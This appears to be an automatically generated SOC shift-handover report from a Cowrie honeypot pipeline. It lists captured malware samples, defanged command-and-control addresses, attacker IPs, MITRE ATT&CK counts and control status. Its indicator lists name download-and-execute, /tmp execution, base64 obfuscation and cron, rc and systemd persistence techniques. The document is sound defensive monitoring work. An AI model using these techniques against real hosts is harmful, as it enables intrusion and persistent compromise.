| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `1ff7c192f591fe63fae453eb8a91da94b276376d3880e3078c3c5a20ba6b45ab` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ff7c192f591fe63...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `177.8.166[.]2` | BR | GRUPOHOST COMUNICACAO MULTIMIDIA LTDA | **100** ⚠️ | 9 |
| `115.190.188[.]201` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 15 |
| `177.136.245[.]42` | BR | EVEO S.A. | **100** ⚠️ | 6 |
| `222.104.99[.]233` | KR | Korea Telecom | **100** ⚠️ | 4 |
| `220.93.200[.]5` | KR | Korea Telecom | **100** ⚠️ | 12 |
| `195.178.110[.]218` | NL | TECHOFF SRV LIMITED | **100** ⚠️ | 50 |
| `20.221.74[.]129` | US | Microsoft Corporation | **100** ⚠️ | 5 |
| `71.6.232[.]27` | US | CariNet, Inc. | **100** ⚠️ | 50 |
| `180.76.235[.]157` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 21 |
| `51.254.205[.]161` | FR | OVH SAS | **100** ⚠️ | 3 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 236 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 177 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 63 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 63 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 20 |

---

## 🔕 False Positive Summary (62 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 21 |
| AbuseIPDB score 10 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 18 below threshold 25 | 1 |
| AbuseIPDB score 21 below threshold 25 | 1 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 2 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 31 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 416 cases |
| Tool 34  | Credential Extractor        | ✅ 2918 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 30 fingerprints |
| Tool 36  | Command Clustering          | ✅ 23 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 270 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 62 filtered (14.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 119 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 30 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 170 priority case(s) shown individually · 171 recon entry/entries in table (8 group(s) consolidating 21 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-10-12T20:36:26Z_
